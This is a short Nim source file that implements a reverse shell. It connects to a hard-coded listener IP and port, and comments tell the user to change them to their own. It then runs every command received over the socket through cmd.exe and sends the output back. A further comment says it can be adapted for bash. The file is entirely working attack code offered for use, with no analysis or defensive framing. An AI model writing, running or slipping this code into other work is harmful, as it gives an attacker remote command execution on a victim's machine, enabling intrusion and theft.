import net, osproc, strformat

let
  ip = "172.20.243.239" # <-- Change this to your listener's IP
  port = 1234          # <-- Change this to your listener's PORT
  sock = newSocket()

sock.connect(ip, Port(port))

let prompt = "Nim-Shell> "
while true:
  send(sock, prompt)
  let bad = recvLine(sock)
  let cmd = execProcess(fmt"cmd.exe /C " & bad) # <-- Can work on Linux/Unix if changed to bash command
  send(sock, cmd)